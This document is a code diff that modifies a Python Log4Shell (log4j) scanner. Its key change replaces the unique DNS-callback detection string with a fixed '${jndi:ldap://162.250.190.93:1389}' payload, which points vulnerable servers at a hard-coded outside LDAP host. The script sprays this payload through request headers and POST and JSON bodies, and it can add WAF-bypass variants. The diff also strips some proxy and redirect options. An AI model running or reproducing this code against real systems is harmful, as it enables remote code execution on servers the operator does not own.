@@ -43,7 +43,8 @@ if len(sys.argv) <= 1:
 
 
 default_headers = {
-    'User-Agent': 'log4j-scan (https://github.com/mazen160/log4j-scan)',
+    'User-Agent': 'RMcCurdy.com',
+    #'User-Agent': 'log4j-scan (https://github.com/mazen160/log4j-scan)',
     # 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
     'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers
 }
@@ -109,10 +110,6 @@ parser.add_argument("--custom-dns-callback-host",
                     dest="custom_dns_callback_host",
                     help="Custom DNS Callback Host.",
                     action='store')
-parser.add_argument("--disable-http-redirects",
-                    dest="disable_redirects",
-                    help="Disable HTTP redirects. Note: HTTP redirects are useful as it allows the payloads to have higher chance of reaching vulnerable systems.",
-                    action='store_true')
 
 args = parser.parse_args()
 
@@ -156,15 +153,11 @@ def generate_waf_bypass_payloads(callback_host, random_string):
 class Dnslog(object):
     def __init__(self):
         self.s = requests.session()
-        req = self.s.get("http://www.dnslog.cn/getdomain.php",
-                         proxies=proxies,
-                         timeout=30)
+        req = self.s.get("http://www.dnslog.cn/getdomain.php", timeout=30)
         self.domain = req.text
 
     def pull_logs(self):
-        req = self.s.get("http://www.dnslog.cn/getrecords.php",
-                         proxies=proxies,
-                         timeout=30)
+        req = self.s.get("http://www.dnslog.cn/getrecords.php", timeout=30)
         return req.json()
 
 
@@ -190,8 +183,6 @@ class Interactsh:
 
         self.session = requests.session()
         self.session.headers = self.headers
-        self.session.verify = False
-        self.session.proxies = proxies
         self.register()
 
     def register(self):
@@ -261,7 +252,8 @@ def parse_url(url):
 def scan_url(url, callback_host):
     parsed_url = parse_url(url)
     random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
-    payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
+    #payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
+    payload = '${jndi:ldap://162.250.190.93:1389}'
     payloads = [payload]
     if args.waf_bypass_payloads:
         payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
@@ -275,7 +267,6 @@ def scan_url(url, callback_host):
                                  headers=get_fuzzing_headers(payload),
                                  verify=False,
                                  timeout=timeout,
-                                 allow_redirects=(not args.disable_redirects),
                                  proxies=proxies)
             except Exception as e:
                 cprint(f"EXCEPTION: {e}")
@@ -290,7 +281,6 @@ def scan_url(url, callback_host):
                                  data=get_fuzzing_post_data(payload),
                                  verify=False,
                                  timeout=timeout,
-                                 allow_redirects=(not args.disable_redirects),
                                  proxies=proxies)
             except Exception as e:
                 cprint(f"EXCEPTION: {e}")
@@ -304,7 +294,6 @@ def scan_url(url, callback_host):
                                  json=get_fuzzing_post_data(payload),
                                  verify=False,
                                  timeout=timeout,
-                                 allow_redirects=(not args.disable_redirects),
                                  proxies=proxies)
             except Exception as e:
                 cprint(f"EXCEPTION: {e}")
@@ -347,7 +336,7 @@ def main():
 
     cprint("[•] Payloads sent to all URLs. Waiting for DNS OOB callbacks.", "cyan")
     cprint("[•] Waiting...", "cyan")
-    time.sleep(int(args.wait_time))
+    time.sleep(args.wait_time)
     records = dns_callback.pull_logs()
     if len(records) == 0:
         cprint("[•] Targets does not seem to be vulnerable.", "green")
